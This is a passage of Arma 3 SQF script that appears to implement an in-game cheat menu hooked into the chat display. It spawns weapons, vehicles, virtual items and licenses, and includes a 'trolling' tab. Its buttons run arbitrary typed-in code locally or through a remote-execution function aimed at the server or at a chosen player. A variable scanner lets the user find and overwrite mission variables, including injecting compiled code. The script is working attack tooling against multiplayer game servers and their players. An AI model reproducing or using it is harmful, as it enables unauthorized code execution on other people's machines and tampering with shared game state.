addPrimaryWeaponItem'muzzle_snds_338_black';(player getVariable'Dummy') addPrimaryWeaponItem'acc_pointer_IR';(player getVariable'Dummy') addPrimaryWeaponItem'optic_tws_mg';(player getVariable'Dummy') addPrimaryWeaponItem'bipod_01_F_blk';(player getVariable'Dummy') addWeapon'launch_I_Titan_F';(player getVariable'Dummy') addWeapon'hgun_Pistol_Signal_F';(player getVariable'Dummy') addWeapon'Rangefinder';(player getVariable'Dummy') linkItem'ItemMap';(player getVariable'Dummy') linkItem'ItemCompass';(player getVariable'Dummy') linkItem'ItemWatch';(player getVariable'Dummy') linkItem'NVGoggles_OPFOR';(player getVariable'Dummy') setFace'WhiteHead_05';(player getVariable'Dummy') setSpeaker'Male01GRE'}];
                _1 addAction['RETURN TO PLAYER',{player switchCamera'External';deleteVehicle(player getVariable'Dummy')}];
                player remoteControl _1;
                _1 switchCamera'External';
                []spawn{
                    while{(!isNull(player getVariable'Dummy'))&&{alive(player getVariable'Dummy')}}do{
                        (vehicle(player getVariable'Dummy'))switchCamera'External';
                        player remoteControl(player getVariable'Dummy');
                        sleep 2;
                    };
                };
                waitUntil{!alive _1 || isNull _1};
                deleteVehicle _1;
                player switchCamera'External';
            };
        }],
        ['RETURN TO PLAYER',{
            player switchCamera'External';
            deleteVehicle(player getVariable'Dummy')
        }]
    ];

    _FUNCTIONS_CODE="tvClear((finddisplay 24)displayCtrl 1502);{_1=((finddisplay 24)displayCtrl 1502)tvAdd[[],_x select 0];switch(count _x)do{case 3:{_2=((finddisplay 24)displayCtrl 1502)tvAdd[[_1],(_x select 0)+' on'];_3=((finddisplay 24)displayCtrl 1502)tvAdd[[_1],(_x select 0)+' off'];((finddisplay 24)displayCtrl 1502)tvSetData[[_1],str{hint'Please expand this option'}];((finddisplay 24)displayCtrl 1502)tvSetData[[_1,_2],str(_x select 1)];((finddisplay 24)displayCtrl 1502)tvSetData[[_1,_3],str(_x select 2)]};case 2:{((finddisplay 24)displayCtrl 1502)tvSetData[[_1],str(_x select 1)]};};}forEach";

    call compile("{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2400,false],[2401,true],[2402,true],[2403,true],[2404,true],[2406,true]];ctrlSetFocus((finddisplay 24)displayCtrl 1500);"+_FUNCTIONS_CODE+str _FUNCTIONS_SELF);

    private ["_buttonAction"];
    _buttonAction = "";
    {
        switch (_x) do {
            case (findDisplay 24 displayCtrl 2400): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2400,false],[2401,true],[2402,true],[2403,true],[2404,true],[2406,true]];ctrlSetFocus((finddisplay 24)displayCtrl 1500);"+_FUNCTIONS_CODE+str _FUNCTIONS_SELF};
            case (findDisplay 24 displayCtrl 2401): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2401,false],[2400,true],[2402,true],[2403,true],[2404,true],[2406,true]];ctrlSetFocus((finddisplay 24)displayCtrl 1500);"+_FUNCTIONS_CODE+str _FUNCTIONS_REMOTE};
            case (findDisplay 24 displayCtrl 2402): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2402,false],[2401,true],[2400,true],[2403,true],[2404,true],[2406,true]];ctrlSetFocus((finddisplay 24)displayCtrl 1500);"+_FUNCTIONS_CODE+str _FUNCTIONS_TARGET};
            case (findDisplay 24 displayCtrl 2403): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2403,false],[2401,true],[2402,true],[2400,true],[2404,true],[2406,true]];ctrlSetFocus((finddisplay 24)displayCtrl 1500);"+_FUNCTIONS_CODE+str _FUNCTIONS_LIFE};
            case (findDisplay 24 displayCtrl 2404): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2404,false],[2401,true],[2402,true],[2403,true],[2400,true],[2406,true]];ctrlSetFocus((finddisplay 24)displayCtrl 1500);"+_FUNCTIONS_CODE+str _FUNCTIONS_DUMMY};
            case (findDisplay 24 displayCtrl 2406): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2406,false],[2401,true],[2402,true],[2403,true],[2404,true],[2400,true]];ctrlSetFocus((finddisplay 24)displayCtrl 1500);"+_FUNCTIONS_CODE+str _FUNCTIONS_TROLLING};
            case (findDisplay 24 displayCtrl 2407): {_buttonAction = "((finddisplay 24)displayCtrl 2407)ctrlEnable false;((finddisplay 24)displayCtrl 2408)ctrlEnable true;((finddisplay 24)displayCtrl 2409)ctrlEnable true;tvClear((finddisplay 24)displayCtrl 1500);ctrlSetFocus((finddisplay 24)displayCtrl 1500);_1=[];_3=configFile >> 'CfgWeapons';for '_i' from 0 to count (_3)-1 do {_2=_3 select _i;if(isClass _2)then{_4=configName _2;_5=getNumber(_2 >> 'scope');_6=getText(_2 >> 'picture');_7=getText(_2 >> 'displayName');if(_5==2&&_6!=''&&_7!='') then {_1=_1 + [[_7,_4,_6]];};};};{_8=_x;_9=_8 select 0;_10=_8 select 1;_11=_8 select 2;_i=((finddisplay 24)displayCtrl 1500)tvAdd[[],_9];((finddisplay 24)displayCtrl 1500)tvSetPicture[[_i],_11];((finddisplay 24)displayCtrl 1500)tvSetData[[_i],_10];}forEach _1;((finddisplay 24)displayCtrl 1500)tvSetCurSel[0]"};
            case (findDisplay 24 displayCtrl 2408): {_buttonAction = "((finddisplay 24)displayCtrl 2407)ctrlEnable true;((finddisplay 24)displayCtrl 2408)ctrlEnable false;((finddisplay 24)displayCtrl 2409)ctrlEnable true;tvClear((finddisplay 24)displayCtrl 1500);ctrlSetFocus((finddisplay 24)displayCtrl 1500);_1=[];_3=configFile >> 'CfgVehicles';for '_i' from 0 to count (_3)-1 do {_2=_3 select _i;if(isClass _2)then{_4=configName _2;_5=getNumber(_2 >> 'scope');_6=getText(_2 >> 'picture');_7=getText(_2 >> 'displayName');if (_5 == 2 && (_4 isKindOf 'LandVehicle' || _4 isKindOf 'Bag_Base' || _4 isKindOf 'Air' || _4 isKindOf 'Ship') && _6 !='' &&!((_4 isKindOf'ParachuteBase') || (_4 isKindOf'BIS_Steerable_Parachute'))) then {_1=_1 + [[_7,_4,_6]];};};};{_8=_x;_9=_8 select 0;_10=_8 select 1;_11=_8 select 2;_i=((finddisplay 24)displayCtrl 1500)tvAdd[[],_9];((finddisplay 24)displayCtrl 1500)tvSetPicture[[_i],_11];((finddisplay 24)displayCtrl 1500)tvSetData[[_i],_10];}forEach _1;((finddisplay 24)displayCtrl 1500)tvSetCurSel[0]"};
            case (findDisplay 24 displayCtrl 2409): {_buttonAction = "((finddisplay 24)displayCtrl 2407)ctrlEnable true;((finddisplay 24)displayCtrl 2408)ctrlEnable true;((finddisplay 24)displayCtrl 2409)ctrlEnable false;tvClear((finddisplay 24)displayCtrl 1500);ctrlSetFocus((finddisplay 24)displayCtrl 1500);_1=[];{_1 pushBack(configName _x)}forEach('true'configClasses(missionConfigFile>>'VirtualItems'));_2=[];{_2 pushBack(configName _x)}forEach('true'configClasses(missionConfigFile>>'Licenses'));{_i=((finddisplay 24)displayCtrl 1500)tvAdd[[],localize getText(missionConfigFile>>'VirtualItems'>>_x>>'displayName')];((finddisplay 24)displayCtrl 1500)tvSetPicture[[_i],getText(missionConfigFile>>'VirtualItems'>>_x>>'icon')];((finddisplay 24)displayCtrl 1500)tvSetData[[_i],_x];}forEach(_1);{_i=((finddisplay 24)displayCtrl 1500)tvAdd[[],localize getText(missionConfigFile>>'Licenses'>>_x>>'displayName')];((finddisplay 24)displayCtrl 1500)tvSetData[[_i],_x];}forEach(_2);((finddisplay 24)displayCtrl 1500)tvSetCurSel[0]"};
            case (findDisplay 24 displayCtrl 2410): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2410,false],[2411,true],[2412,true]];{((finddisplay 24)displayCtrl(_x select 0))ctrlShow(_x select 1)}forEach[[1113,true],[1808,false],[1809,false],[13766,true],[1102,true],[2444,false],[2445,false],[1611,false],[1501,false],[1401,false],[1000,false],[2100,false],[1001,false],[1002,false],[1504,false],[1003,false],[1004,false],[1005,false],[1402,false],[1006,false],[1600,false],[2205,true],[5501,false],[2441,true],[2442,true],[2443,true]];((findDisplay 24)displayCtrl 13366)ctrlShow false;((findDisplay 24)displayCtrl 14466)ctrlShow false"};
            case (findDisplay 24 displayCtrl 2411): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2410,true],[2411,false],[2412,true]];{((finddisplay 24)displayCtrl(_x select 0))ctrlShow(_x select 1)}forEach[[1611,true],[1113,false],[1808,true],[1809,true],[13766,false],[2444,true],[2445,true],[5501,false],[1501,true],[1401,true],[1000,true],[2100,true],[1001,true],[1002,true],[1504,true],[1003,true],[1004,true],[1005,true],[1402,true],[1006,true],[1600,true],[2441,false],[2442,false],[2205,true],[1102,true],[2443,false]];"};
            case (findDisplay 24 displayCtrl 2412): {_buttonAction = "{((finddisplay 24)displayCtrl(_x select 0))ctrlEnable(_x select 1)}forEach[[2410,true],[2411,true],[2412,false]];{((finddisplay 24)displayCtrl(_x select 0))ctrlShow(_x select 1)}forEach[[1113,false],[1808,false],[1809,false],[1611,false],[1501,false],[2444,false],[2445,false],[1401,false],[1000,false],[2100,false],[1001,false],[1002,false],[1504,false],[1003,false],[1004,false],[1005,false],[1402,false],[1006,false],[1600,false],[13766,false],[1102,false],[2205,false],[5501,true],[2441,false],[2442,false],[2443,false]];"};
            case (findDisplay 24 displayCtrl 2443): {_buttonAction = "[]spawn compile ctrlText((finddisplay 24)displayCtrl 13766)"};
            case (findDisplay 24 displayCtrl 2442): {_buttonAction = "(compile ctrlText((finddisplay 24)displayCtrl 13766))call(profileNamespace getVariable'MAIN_RE')"};
            case (findDisplay 24 displayCtrl 2441): {_buttonAction = "(compile((format['if(player!=objectFromNetId''%1'')exitWith{};',(((finddisplay 24)displayCtrl 1503)tvData(tvCurSel((finddisplay 24)displayCtrl 1503)))])+ctrlText((finddisplay 24)displayCtrl 13766)))call(profileNamespace getVariable'MAIN_RE')"};
            case (findDisplay 24 displayCtrl 2444): {_buttonAction = "tvClear((finddisplay 24)displayCtrl 1501);{if(typeName(missionNamespace getVariable _x)==(((finddisplay 24)displayCtrl 2100)lbText lbCurSel((finddisplay 24)displayCtrl 2100)))then{switch(typeName(missionNamespace getVariable _x))do{case'SCALAR':{if(missionNamespace getVariable _x==parseNumber ctrlText((finddisplay 24)displayCtrl 1401))then{_1=((finddisplay 24)displayCtrl 1501)tvAdd[[],_x];((finddisplay 24)displayCtrl 1501)tvSetData[[_1],typeName(missionNamespace getVariable _x)];};};case'CODE':{if(((str(missionNamespace getVariable _x))find(ctrlText((finddisplay 24)displayCtrl 1401)))>-1)then{_1=((finddisplay 24)displayCtrl 1501)tvAdd[[],_x];((finddisplay 24)displayCtrl 1501)tvSetData[[_1],typeName(missionNamespace getVariable _x)];};};case'STRING':{if(((str(missionNamespace getVariable _x))find(ctrlText((finddisplay 24)displayCtrl 1401)))>-1)then{_1=((finddisplay 24)displayCtrl 1501)tvAdd[[],_x];((finddisplay 24)displayCtrl 1501)tvSetData[[_1],typeName(missionNamespace getVariable _x)];};};case'BOOL':{if((str(missionNamespace getVariable _x))==ctrlText((finddisplay 24)displayCtrl 1401))then{_1=((finddisplay 24)displayCtrl 1501)tvAdd[[],_x];((finddisplay 24)displayCtrl 1501)tvSetData[[_1],typeName(missionNamespace getVariable _x)];};};};};}forEach allVariables missionNamespace;"};
            case (findDisplay 24 displayCtrl 2445): {_buttonAction = "_t=(((finddisplay 24)displayCtrl 1504)tvText(tvCurSel((finddisplay 24)displayCtrl 1504)));_d=(((finddisplay 24)displayCtrl 1504)tvData(tvCurSel((finddisplay 24)displayCtrl 1504)));switch(_d)do{case'STRING':{missionNamespace setVariable[_t,ctrlText((finddisplay 24)displayCtrl 1402)];};case'SCALAR':{missionNamespace setVariable[_t,parseNumber ctrlText((finddisplay 24)displayCtrl 1402)];};case'CODE':{missionNamespace setVariable[_t,compile ctrlText((finddisplay 24)displayCtrl 1402)];};case'BOOL':{missionNamespace setVariable[_t,switch(tolower ctrlText((finddisplay 24)displayCtrl 1402))do{case'true':{true};case'false':{false}}];};};"};
            default {_buttonAction = ""};
        };
        if (_buttonAction != "") then {
            _x buttonSetAction _buttonAction;
        };
    } forEach allControls(finddisplay 24);

    ((finddisplay 24)displayCtrl 1502)tvSetCurSel[0];
    ((finddisplay 24)displayCtrl 1500)ctrlSetTextColor[1,1,1,1];
    ((finddisplay 24)displayCtrl 1501)ctrlSetTextColor[1,1,1,1];
    ((finddisplay 24)displayCtrl 1502)ctrlSetTextColor[1,1,1,1];
    ((finddisplay 24)displayCtrl 1503)ctrlSetTextColor[1,1,1,1];
    ((finddisplay 24)displayCtrl 1504)ctrlSetTextColor[1,1,1,1];
    ((finddisplay 24)displayCtrl 1502)ctrlSetFontHeight 0.035;
    ((finddisplay 24)displayCtrl 1502)ctrlAddEventHandler['TreeDblClick',{call call compile(((finddisplay 24)displayCtrl 1502)tvData(tvCurSel((finddisplay 24)displayCtrl 1502)))}];
    ((finddisplay 24)displayCtrl 1504)ctrlAddEventHandler['TreeDblClick',{tvClear((finddisplay 24)displayCtrl 1504);uiNamespace setVariable['shit',[]]}];
    ((finddisplay 24)displayCtrl 1501)ctrlAddEventHandler['TreeDblClick',{
        _t=(((finddisplay 24)displayCtrl 1501)tvText(tvCurSel((finddisplay 24)displayCtrl 1501)));
        _d=(((finddisplay 24)displayCtrl 1501)tvData(tvCurSel((finddisplay 24)displayCtrl 1501)));
        _1=((finddisplay 24)displayCtrl 1504)tvAdd[[],_t];
        ((finddisplay 24)displayCtrl 1504)tvSetData[[_1],_d];
        _2=uiNamespace getVariable['shit',[]];
        _2 pushBack[_t,_d];
        uiNamespace setVariable['shit',_2];
    }];
    ((finddisplay 24)displayCtrl 1504)ctrlAddEventHandler['TreeSelChanged',{
        _t=(((finddisplay 24)displayCtrl 1504)tvText(tvCurSel((finddisplay 24)displayCtrl 1504)));
        _d=(((finddisplay 24)displayCtrl 1504)tvData(tvCurSel((finddisplay 24)displayCtrl 1504)));
        ((finddisplay 24)displayCtrl 1402)ctrlSetText"";
        ((finddisplay 24)displayCtrl 1402)ctrlSetText(str(missionNamespace getVariable _t));
    }];
    ((finddisplay 24)displayCtrl 2400)ctrlEnable false;
    {
        if (ctrlClassName _x == "RscTree") then {
            _x ctrlsetfade 0;
            _x ctrlCommit 0;
        };
    } forEach allControls findDisplay 24;
    waitUntil {isnull findDisplay 24};
    'dynamicBlur' ppEffectEnable true;
    'dynamicBlur' ppEffectAdjust [0];
    'dynamicBlur' ppEffectCommit 0.2;
    waitUntil{isNull(finddisplay 129)};
    };

};
